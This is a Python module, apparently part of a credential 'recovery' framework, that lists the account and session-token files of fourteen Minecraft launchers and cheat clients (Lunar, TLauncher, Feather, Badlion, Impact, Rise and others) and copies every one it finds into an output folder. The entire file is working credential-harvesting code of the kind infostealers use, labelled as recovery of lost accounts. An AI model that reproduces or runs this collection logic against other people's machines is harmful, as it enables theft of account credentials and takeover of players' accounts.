import os
import shutil

from config import ModuleManager, Constant


class MinecraftRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "MinecraftRecovery")
        
        self.banner(r"""
     _______          __   __   _                                   ____  _   
    |.-----.|        (__)_(__) (_) _       ____        _           (____)(_)_ 
    ||x . x||       (_) (_) (_) _ (_)__   (____)  ___ (_)__  ____ (_)__  (___)
    ||_.-._||       (_) (_) (_)(_)(____) (_)_(_)_(___)(____)(____)(____) (_)  
    `--)-(--`       (_)     (_)(_)(_) (_)(__)__(_)___ (_)  ( )_( )(_)    (_)_ 
   __[=== o]___     (_)     (_)(_)(_) (_) (____)(____)(_)   (__)_)(_)     (__)
  |:::::::::::|\    
  `-=========-`()               Recover lost minecraft accounts
                    """)

        self.minecraft_folder = os.path.join(self.output_folder_user, 'applications', 'minecraft')

        if not os.path.isdir(self.minecraft_folder):
            os.makedirs(self.minecraft_folder)
        
        self.minecraftInstallations = {
            "Intent": os.path.join(Constant.userprofile_dir, "intentlauncher", "launcherconfig"),
            "Lunar": os.path.join(Constant.userprofile_dir, ".lunarclient", "settings", "game", "accounts.json"),
            "TLauncher": os.path.join(Constant.roaming_dir, ".minecraft", "TlauncherProfiles.json"),
            "Feather": os.path.join(Constant.roaming_dir, ".feather", "accounts.json"),
            "Meteor": os.path.join(Constant.roaming_dir, ".minecraft", "meteor-client", "accounts.nbt"),
            "Impact": os.path.join(Constant.roaming_dir, ".minecraft", "Impact", "alts.json"),
            "Novoline": os.path.join(Constant.roaming_dir, ".minectaft", "Novoline", "alts.novo"),
            "CheatBreakers": os.path.join(Constant.roaming_dir, ".minecraft", "cheatbreaker_accounts.json"),
            "Microsoft Store": os.path.join(Constant.roaming_dir, ".minecraft", "launcher_accounts_microsoft_store.json"),
            "Rise": os.path.join(Constant.roaming_dir, ".minecraft", "Rise", "alts.txt"),
            "Rise (Intent)": os.path.join(Constant.userprofile_dir, "intentlauncher", "Rise", "alts.txt"),
            "Paladium": os.path.join(Constant.roaming_dir, "paladium-group", "accounts.json"),
            "PolyMC": os.path.join(Constant.roaming_dir, "PolyMC", "accounts.json"),
            "Badlion": os.path.join(Constant.roaming_dir, "Badlion Client", "accounts.json"),
        }
    
    def run(self) -> None:
        totalDone = 0
        for name, path in self.minecraftInstallations.items():
            if os.path.isfile(path):
                self.mdebug(f"[{name}] Found Minecraft installation at: {path}")
                try:
                    shutil.copy(path, self.output_folder)
                    self.mprint(f"[{name}] Saved Minecraft installation to {self.output_folder}")
                    totalDone += 1
                except Exception as e:
                    self.merror(f"[{name}] Unable to copy {path} to {self.output_folder} -> {e}")
            else:
                self.merror(f"[{name}] Unable to find Minecraft installation at: {path}")
        
        self.mprint(f"Found a total of {totalDone} Minecraft Installations")
